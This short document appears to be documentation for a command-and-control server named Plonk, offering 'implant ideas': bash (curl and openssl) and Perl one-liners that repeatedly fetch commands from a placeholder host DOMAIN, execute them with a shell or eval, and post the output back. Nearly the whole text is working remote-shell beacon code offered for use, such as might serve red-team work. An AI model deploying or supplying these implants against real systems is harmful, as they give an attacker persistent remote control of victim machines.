Implant Ideas
=============
Below is a small collection of implant ideas.  They assume Plonk is listening
for queries to DOMAIN:443.  ImplantIDs are either random or hard-coded to
IMPLANTID.  There's 15 seconds between callbacks.

Shell / cURL
------------
```bash
ID="$RANDOM" while :; do curl -s "https://DOMAIN/t/$ID" | /bin/sh | curl --data-binary @- -s "https://DOMAIN/o/$ID"; sleep 15; done
```

This is particularly noisy with `plonk -verbose`.

Shell / openssl
---------------
```bash
ID="$RANDOM" while :; do
        printf "GET /t/$ID HTTP/1.0\r\n\r\n" |
                openssl s_client -quiet -connect DOMAIN:443 2>/dev/null |
                tr -d '\r' | egrep -v '^$' | tail -n +5 |
                while read tline; do
                        O="$(echo "$tline" | (sh 2>&1))"
                        echo "POST /o/$ID HTTP/1.0\r\nContent-length: ${#O}\r\n\r\n$O" |
                                (openssl s_client -connect DOMAIN:443 >/dev/null 2>&1)
                done
        sleep 15
done
```

Perl
----
```perl
use LWP::Simple;for(;;){if(""eq($t=get("https://DOMAIN/t/IMPLANTID"))){sleep 15;next}else{LWP::UserAgent->new->request(HTTP::Request->new("POST","https://DOMAIN/o/IMPLANTID",[],Encode::encode("ascii",`$t 2>&1`)));}}
```
Or, to run Perl code and not shell input:
```perl
use LWP::Simple;for(;;){if(""eq($t=get("http://127.0.0.1:8080/t/kittens"))){sleep 4;next}else{LWP::UserAgent->new->request(HTTP::Request->new("POST","http://127.0.0.1:8080/o/kittens",[],Encode::encode("ascii",eval$t)));}}
```
